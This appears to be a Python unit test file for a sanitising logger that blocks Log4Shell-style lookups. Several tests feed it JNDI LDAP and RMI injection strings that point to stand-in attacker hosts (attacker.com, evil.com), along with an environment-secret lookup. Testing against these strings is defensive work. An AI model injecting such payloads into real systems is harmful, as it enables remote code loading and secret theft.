import unittest
from src.logger import SecureLogger

class TestSecureLogger(unittest.TestCase):
    
    def setUp(self):
        self.logger = SecureLogger("test_logger")
    
    def test_jndi_ldap_blocked(self):
        """Test that JNDI LDAP lookups are sanitized"""
        malicious_input = "${jndi:ldap://attacker.com/exploit}"
        result = self.logger._sanitize(malicious_input)
        self.assertEqual(result, "[BLOCKED_JNDI]")
        self.assertNotIn("${jndi:", result)
    
    def test_jndi_rmi_blocked(self):
        """Test that JNDI RMI lookups are sanitized"""
        malicious_input = "${jndi:rmi://attacker.com/exploit}"
        result = self.logger._sanitize(malicious_input)
        self.assertEqual(result, "[BLOCKED_JNDI]")
    
    def test_case_insensitive_blocking(self):
        """Test that JNDI blocking is case insensitive"""
        malicious_input = "${Jndi:Ldap://attacker.com/exploit}"
        result = self.logger._sanitize(malicious_input)
        self.assertEqual(result, "[BLOCKED_JNDI]")
    
    def test_normal_message_preserved(self):
        """Test that normal log messages are preserved"""
        normal_input = "User login successful for user123"
        result = self.logger._sanitize(normal_input)
        self.assertEqual(result, normal_input)
    
    def test_other_lookups_sanitized(self):
        """Test that other lookup patterns are also sanitized"""
        lookup_input = "${env:SECRET_KEY}"
        result = self.logger._sanitize(lookup_input)
        self.assertEqual(result, "[env:SECRET_KEY]")
    
    def test_mixed_content(self):
        """Test mixed content with JNDI and normal text"""
        mixed_input = "Error occurred: ${jndi:ldap://evil.com/a} for user"
        result = self.logger._sanitize(mixed_input)
        self.assertEqual(result, "Error occurred: [BLOCKED_JNDI] for user")

if __name__ == '__main__':
    unittest.main()